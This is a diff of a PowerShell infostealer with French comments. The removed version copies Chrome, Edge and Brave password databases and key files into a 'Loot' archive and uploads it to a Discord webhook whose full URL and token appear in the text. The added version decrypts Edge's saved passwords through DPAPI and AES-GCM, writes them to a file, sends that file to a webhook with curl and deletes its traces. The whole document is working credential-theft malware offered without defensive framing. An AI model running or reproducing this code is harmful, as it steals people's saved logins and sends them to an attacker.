@@ -1,54 +1,80 @@
-$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"
+$wh="https://discord.com/api/webhooks/XXXXX/XXXXX"
 
-# Kill browsers
-taskkill /F /IM chrome.exe,msedge.exe,brave.exe 2>$null
+# Kill Edge
+taskkill /F /IM msedge.exe 2>$null
 Start-Sleep -Seconds 2
 
-# Setup
-cd $env:TEMP
-Remove-Item Loot -Recurse -Force -EA 0
-mkdir Loot -Force | Out-Null
-
-# Chemins
-$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-$chromeRoot = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 $edgeRoot = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-$bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
-$braveRoot = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+$loginData = "$edgeRoot\Default\Login Data"
+$localState = "$edgeRoot\Local State"
 
-# Copier Chrome
-if (Test-Path "$chromePath\Login Data") {
-    Copy-Item "$chromePath\Login Data" "Loot\Chrome_Passwords.db" -EA 0
-}
-if (Test-Path "$chromeRoot\Local State") {
-    Copy-Item "$chromeRoot\Local State" "Loot\Chrome_Local_State" -EA 0
+if (!(Test-Path $loginData) -or !(Test-Path $localState)) {
+    exit
 }
 
-# Copier Edge
-if (Test-Path "$edgePath\Login Data") {
-    Copy-Item "$edgePath\Login Data" "Loot\Edge_Passwords.db" -EA 0
-}
-if (Test-Path "$edgeRoot\Local State") {
-    Copy-Item "$edgeRoot\Local State" "Loot\Edge_Local_State" -EA 0
-}
+# --- Récupération de la clé AES ---
+$ls = Get-Content -Raw $localState | ConvertFrom-Json
+$rawKey = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
 
-# Copier Brave
-if (Test-Path "$bravePath\Login Data") {
-    Copy-Item "$bravePath\Login Data" "Loot\Brave_Passwords.db" -EA 0
-}
-if (Test-Path "$braveRoot\Local State") {
-    Copy-Item "$braveRoot\Local State" "Loot\Brave_Local_State" -EA 0
+if ([Text.Encoding]::ASCII.GetString($rawKey[0..4]) -ne "DPAPI") {
+    exit
 }
 
-# Compresser
-Compress-Archive -Path "Loot\*" -DestinationPath "loot.zip" -Force
+$dpapiBlob = $rawKey[5..($rawKey.Length-1)]
+$aesKey = [Security.Cryptography.ProtectedData]::Unprotect(
+    $dpapiBlob, $null,
+    [Security.Cryptography.DataProtectionScope]::CurrentUser
+)
 
-# Upload
-curl.exe -F "file=@loot.zip" -F "content=**Loot from $env:COMPUTERNAME**" $wh
+# --- Copie DB (SQLite verrouillée sinon) ---
+$tmpDb = "$env:TEMP\edge.db"
+Copy-Item $loginData $tmpDb -Force
 
-# Cleanup
-Start-Sleep -Seconds 3
-Remove-Item "loot.zip","Loot" -Recurse -Force -EA 0
+Add-Type -AssemblyName System.Data
+$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmpDb;Version=3;")
+$conn.Open()
 
+$cmd = $conn.CreateCommand()
+$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+$r = $cmd.ExecuteReader()
 
+$out = "$env:TEMP\edge_passwords.txt"
+"" | Set-Content $out
+
+while ($r.Read()) {
+    $url = $r.GetString(0)
+    $user = $r.GetString(1)
+    $enc  = $r.GetValue(2)
+
+    if ($enc.Length -lt 20) { continue }
+
+    $ver = [Text.Encoding]::ASCII.GetString($enc[0..2])
+
+    if ($ver -in @("v10","v11","v20")) {
+        $nonce = $enc[3..14]
+        $cipher = $enc[15..($enc.Length-17)]
+        $tag = $enc[($enc.Length-16)..($enc.Length-1)]
+
+        $aes = [Security.Cryptography.Aes]::Create()
+        $aes.Mode = "GCM"
+
+        try {
+            $pt = New-Object byte[] $cipher.Length
+            $aesgcm = New-Object Security.Cryptography.AesGcm($aesKey)
+            $aesgcm.Decrypt($nonce, $cipher, $tag, $pt)
+            $pass = [Text.Encoding]::UTF8.GetString($pt)
+
+            Add-Content $out "URL: $url"
+            Add-Content $out "USER: $user"
+            Add-Content $out "PASS: $pass"
+            Add-Content $out "----"
+        } catch {}
+    }
+}
+
+$conn.Close()
+
+# Exfil
+curl.exe -F "file=@$out" -F "content=**Edge passwords from $env:COMPUTERNAME**" $wh
+
+Remove-Item $out,$tmpDb -Force
